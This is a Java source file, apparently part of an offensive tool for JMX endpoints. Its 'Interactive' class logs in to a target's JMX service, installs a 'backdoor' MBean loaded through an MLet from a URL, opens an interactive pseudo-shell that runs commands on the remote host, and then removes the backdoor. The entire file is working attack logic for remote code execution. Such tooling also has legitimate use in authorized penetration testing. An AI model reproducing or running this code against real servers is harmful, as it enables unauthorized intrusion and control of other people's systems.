package fr.jrjgjk.actions;

import fr.jrjgjk.Config;
import fr.jrjgjk.mbeanhelpers.MBeanOpManager;
import fr.jrjgjk.mbeanhelpers.MBeanServer;
import fr.jrjgjk.mbeanhelpers.MBeanConnect;
import fr.jrjgjk.helpers.Printer;
import fr.jrjgjk.helpers.InteractiveShell;
import fr.jrjgjk.shellcmd.RemoteCaller;
import fr.jrjgjk.LocalServer;


/**
 * Interactive class used to exploit the jmx endpoint with an interactive pseudo-shell
 * This class implements the action interface
 * 
 * It also implements the MBeanConnect class, so it can connect to the remote server
 */
public class Interactive extends MBeanConnect implements Action{
	private MBeanOpManager mBeanOpManager = null;
	private MBeanServer mBeanServer = null;
	private String username;
	private String password;

	private LocalServer lServer = null;

	public Interactive(String target, int port, String username, String password, String boundName, LocalServer lServer) {
		super(target, port, boundName);
		this.username = username;
		this.password = password;
		this.lServer = lServer;
	}

	private void initMBeanServerConnection()
	{
		try{
			this.connect(this.username, this.password);
		} catch (Exception ex){
			Printer.err("Connection to target failed...");
			Printer.verr("Url: " + this.getUrl());
			ex.printStackTrace();
			System.exit(1);
		}
	}

	private void initMBeanOperationsManager()
	{
		try{
			this.mBeanOpManager = new MBeanOpManager(Config.mLetName, Config.objectName);
			this.mBeanOpManager.setMBeanServer(this.lServer);
		} catch (Exception ex){
			Printer.err("An exception occured while initilizing object name...");
			ex.printStackTrace();
			System.exit(1);
		}
	}

	private void installBackdoor()
	{
		this.mBeanOpManager.installMBeanMlet(this.getConnection());
		this.mBeanOpManager.installMBeanFromUrl(this.getConnection());
	}

	@Override
	public void init(){
		this.initMBeanServerConnection(); 
		this.initMBeanOperationsManager();
	}

	@Override
	public void run(){
		Printer.vinfo("Installing backdoor if needed...");
		this.installBackdoor();

		Printer.vinfo("Starting interactive shell...");
		InteractiveShell iShell = new InteractiveShell(new RemoteCaller(this.mBeanOpManager, this.getConnection()));
		iShell.startRoutine();

		Printer.info("Cleaning backdoor...");
		this.mBeanOpManager.cleanAll(this.getConnection());

	}

}